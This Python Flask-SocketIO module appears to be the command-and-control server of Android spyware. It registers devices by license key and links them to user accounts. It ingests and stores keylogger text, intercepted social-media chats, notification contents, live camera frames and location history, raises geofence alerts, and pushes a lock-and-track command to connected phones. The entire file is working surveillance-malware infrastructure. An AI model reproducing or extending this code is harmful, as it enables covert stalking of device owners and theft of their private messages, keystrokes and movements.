import os
import time
import math
from flask import request
from flask_socketio import emit, join_room
from core.database import (
    database, users_database, connected_devices, sid_to_device,
    connected_device_licenses, save_db, save_users_db
)
from core.parsers import update_device_record

def calculate_distance(lat1, lng1, lat2, lng2):
    R = 6371000.0  # Earth radius in meters
    phi1 = math.radians(lat1)
    phi2 = math.radians(lat2)
    delta_phi = math.radians(lat2 - lat1)
    delta_lambda = math.radians(lng2 - lng1)
    a = math.sin(delta_phi / 2.0) ** 2 + math.cos(phi1) * math.cos(phi2) * math.sin(delta_lambda / 2.0) ** 2
    c = 2.0 * math.atan2(math.sqrt(a), math.sqrt(1.0 - a))
    return R * c

def log_geofence_event(device_id, fence_id, fence_name, fence_type, event):
    if device_id not in database:
        database[device_id] = {}
    if "geofence_events" not in database[device_id]:
        database[device_id]["geofence_events"] = []
    
    events = database[device_id]["geofence_events"]
    timestamp = time.strftime("%b %d, %Y %I:%M %p")
    events.insert(0, {
        "fence_id": fence_id,
        "name": fence_name,
        "type": fence_type,
        "event": event,
        "time": timestamp
    })
    database[device_id]["geofence_events"] = events[:50]

def check_geofences_for_device(socketio, device_id, data):
    if not data or "lat" not in data or "lng" not in data:
        return
    lat = data["lat"]
    lng = data["lng"]
    
    device_data = database.get(device_id, {})
    settings = device_data.get("settings", {})
    geofences = settings.get("geofences", [])
    
    if not geofences:
        return
        
    last_states = device_data.get("last_geofence_states", {})
    new_states = {}
    
    for fence in geofences:
        fence_id = fence.get("id")
        fence_lat = fence.get("lat")
        fence_lng = fence.get("lng")
        radius = fence.get("radius")
        fence_name = fence.get("name", "Unknown Fence")
        fence_type = fence.get("type", "allowed")
        
        if not fence_id or fence_lat is None or fence_lng is None or radius is None:
            continue
            
        distance = calculate_distance(lat, lng, fence_lat, fence_lng)
        prev_state = last_states.get(fence_id)
        
        if fence_type == "restricted":
            if distance <= radius:
                new_states[fence_id] = "inside"
                if prev_state != "inside":
                    msg = f"[Geo-Fence] WARNING: Device entered restricted area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Enters")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'enter_restricted',
                        'message': f"Device entered restricted area '{fence_name}'!"
                    })
            else:
                new_states[fence_id] = "outside"
                if prev_state == "inside":
                    msg = f"[Geo-Fence] INFO: Device left restricted area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Leaves")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'leave_restricted',
                        'message': f"Device left restricted area '{fence_name}'."
                    })
        elif fence_type == "allowed":
            if distance > radius:
                new_states[fence_id] = "outside"
                if prev_state != "outside":
                    msg = f"[Geo-Fence] WARNING: Device left allowed area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Leaves")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'leave_allowed',
                        'message': f"Device left allowed area '{fence_name}'!"
                    })
            else:
                new_states[fence_id] = "inside"
                if prev_state == "outside":
                    msg = f"[Geo-Fence] INFO: Device entered allowed area: '{fence_name}'"
                    update_device_record(device_id, "logs", msg)
                    log_geofence_event(device_id, fence_id, fence_name, fence_type, "Enters")
                    socketio.emit('geofence_alert', {
                        'device_id': device_id,
                        'fence_id': fence_id,
                        'name': fence_name,
                        'type': fence_type,
                        'event': 'enter_allowed',
                        'message': f"Device returned to allowed area '{fence_name}'."
                    })
                    
    for k, v in last_states.items():
        if k not in new_states:
            new_states[k] = v
            
    database[device_id]["last_geofence_states"] = new_states
    save_db()

def register_socket_events(socketio):
    @socketio.on('connect')
    def handle_connect():
        device_id = request.args.get('device_id')
        model = request.args.get('model', 'Unknown')
        manf = request.args.get('manf', 'Unknown')
        release = request.args.get('release', 'Unknown')
        license_key = request.args.get('license_key')
        
        if device_id:
            join_room(device_id)
            connected_devices[device_id] = request.sid
            sid_to_device[request.sid] = device_id
            
            if license_key:
                license_key = license_key.strip()
                connected_device_licenses[device_id] = license_key
                
                if device_id not in database:
                    database[device_id] = {"_id": device_id}
                database[device_id]["license_key"] = license_key
                save_db()
                
                if license_key in users_database.get("licenses", {}):
                    username = users_database["licenses"][license_key].get("assigned_to")
                    if username and username in users_database.get("users", {}):
                        if "devices" not in users_database["users"][username]:
                            users_database["users"][username]["devices"] = []
                        if device_id not in users_database["users"][username]["devices"]:
                            users_database["users"][username]["devices"].append(device_id)
                            save_users_db()
                            print(f"[RBAC] Device {device_id} auto-mapped to user: {username}")
            
            ip = request.remote_addr
            info_string = f"model: {model}\nmanufacturer: {manf}\nandroid: {release}\nadmin: false\nbattery: --%\nnotif_pending: 0\nip: {ip}\n"
            update_device_record(device_id, "info", info_string)
            update_device_record(device_id, "logs", "Device Connected via Socket.io")
            
            settings = database.get(device_id, {}).get("settings", {})
            if settings.get("lock_track_enabled", False):
                def delayed_sync(sid, dev_id):
                    socketio.sleep(1.5)
                    print(f"[RBAC] Syncing lock_track enable command to newly connected device {dev_id}")
                    socketio.emit('command', {'action': 'START_LOCK_TRACK'}, room=sid)
                socketio.start_background_task(delayed_sync, request.sid, device_id)
            print(f"[Socket.io] Device connected: {device_id} (Model: {model})")
            socketio.emit('device_status_change', {'device_id': device_id, 'online': True})

    @socketio.on('disconnect')
    def handle_disconnect():
        device_id = sid_to_device.pop(request.sid, None)
        if device_id:
            connected_devices.pop(device_id, None)
            connected_device_licenses.pop(device_id, None)
            print(f"[Socket.io] Device disconnected: {device_id}")
            update_device_record(device_id, "logs", "Device Disconnected")
            socketio.emit('device_status_change', {'device_id': device_id, 'online': False})

    @socketio.on('join_device_room')
    def handle_join_device_room(data):
        if isinstance(data, dict):
            device_id = data.get('device_id')
        else:
            device_id = data
        if device_id:
            join_room(device_id)
            print(f"[Socket.io] Dashboard joined room: {device_id}")

    @socketio.on('camera_frame')
    def handle_camera_frame(data):
        device_id = sid_to_device.get(request.sid)
        if device_id:
            emit('camera_frame_relay', data, room=device_id, include_self=False)

    @socketio.on('keylogs')
    def handle_keylogs(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            pkg = data.get("pkg", "unknown")
            text = data.get("text", "")
            log_time = data.get("time", int(time.time() * 1000))
            
            if device_id not in database: database[device_id] = {"_id": device_id}
            if "keylogs" not in database[device_id]: database[device_id]["keylogs"] = {}
            
            log_id = f"kl_{log_time}"
            database[device_id]["keylogs"][log_id] = {
                "pkg": pkg,
                "text": text,
                "time": log_time
            }
            update_device_record(device_id, "logs", f"Keylog entry received from {pkg}")
            save_db()
            socketio.emit('keylog_received', {
                'device_id': device_id,
                'pkg': pkg,
                'text': text,
                'time': log_time
            })

    @socketio.on('notification_logged')
    def handle_notification_logged(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            pkg = data.get("package", "unknown")
            title = data.get("title", "")
            text = data.get("text", "")
            log_time = data.get("time", "")
            
            file_path = os.path.join("data", device_id, "notifications.txt")
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(f"App: {pkg} | Title: {title} | Msg: {text} | Time: {log_time}\n---\n")
                
            if "info" not in database[device_id]: database[device_id]["info"] = {}
            curr_count = int(database[device_id]["info"].get("notif_pending", 0)) + 1
            database[device_id]["info"]["notif_pending"] = str(curr_count)
            
            if "refs" not in database[device_id]: database[device_id]["refs"] = {}
            database[device_id]["refs"]["notifications"] = int(time.time() * 1000)

    @socketio.on('location')
    def handle_location(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            if "lat" in data and "lng" in data:
                settings = database.get(device_id, {}).get("settings", {})
                if settings.get("lock_track_enabled", False):
                    today_route = database[device_id].get("today_route", [])
                    current_time = time.localtime(data.get("time", int(time.time() * 1000)) / 1000)
                    current_date_str = time.strftime("%Y-%m-%d", current_time)
                    today_route_date = database[device_id].get("today_route_date", current_date_str)
                    
                    if today_route_date != current_date_str:
                        if today_route:
                            route_history = database[device_id].get("route_history", [])
                            route_history.append({
                                "date": today_route_date,
                                "route": today_route
                            })
                            database[device_id]["route_history"] = route_history[-30:]
                        today_route = []
                        database[device_id]["today_route_date"] = current_date_str
                    
                    today_route.append({
                        "lat": data["lat"],
                        "lng": data["lng"],
                        "time": data.get("time", int(time.time() * 1000))
                    })
                    database[device_id]["today_route"] = today_route
                    database[device_id]["today_route_date"] = current_date_str
                    save_db()

            update_device_record(device_id, "location", data)
            check_geofences_for_device(socketio, device_id, data)
            
            if "error" in data:
                socketio.emit('location_error', {
                    'device_id': device_id,
                    'error': data.get("error", "Unknown error")
                })
            else:
                socketio.emit('location_update', {
                    'device_id': device_id,
                    'lat': data.get("lat"),
                    'lng': data.get("lng")
                })

    @socketio.on('social_message')
    def handle_social_message(data):
        device_id = sid_to_device.get(request.sid)
        if device_id and data:
            platform = data.get("platform", "unknown").replace(".", "_")
            contact = data.get("contact", "unknown").replace(".", "_").replace(" ", "_")
            text = data.get("text", "")
            is_sent = data.get("isSent", False)
            msg_time = data.get("time", int(time.time() * 1000))

            if device_id not in database: database[device_id] = {"_id": device_id}
            if "chats" not in database[device_id]: database[device_id]["chats"] = {}
            if platform not in database[device_id]["chats"]: database[device_id]["chats"][platform] = {}
            if contact not in database[device_id]["chats"][platform]:
                database[device_id]["chats"][platform][contact] = {"contactName": contact, "messages": {}}

            messages_dict = database[device_id]["chats"][platform][contact]["messages"]
            is_duplicate = False
            if messages_dict:
                sorted_msgs = sorted(messages_dict.values(), key=lambda x: x.get("time", 0), reverse=True)
                for m in sorted_msgs[:40]:
                    if m.get("text") == text and m.get("type") == ("sent" if is_sent else "received"):
                        if abs(m.get("time", 0) - msg_time) < 86400000:
                            is_duplicate = True
                            break

            if is_duplicate:
                return

            m_id = str(hash(text + ("sent" if is_sent else "received") + str(msg_time)))
            database[device_id]["chats"][platform][contact]["messages"][m_id] = {
                "text": text,
                "type": "sent" if is_sent else "received",
                "time": msg_time
            }
            save_db()
            socketio.emit('social_message_received', {
                'device_id': device_id,
                'platform': platform,
                'contact': contact,
                'text': text,
                'isSent': is_sent,
                'time': msg_time
            })
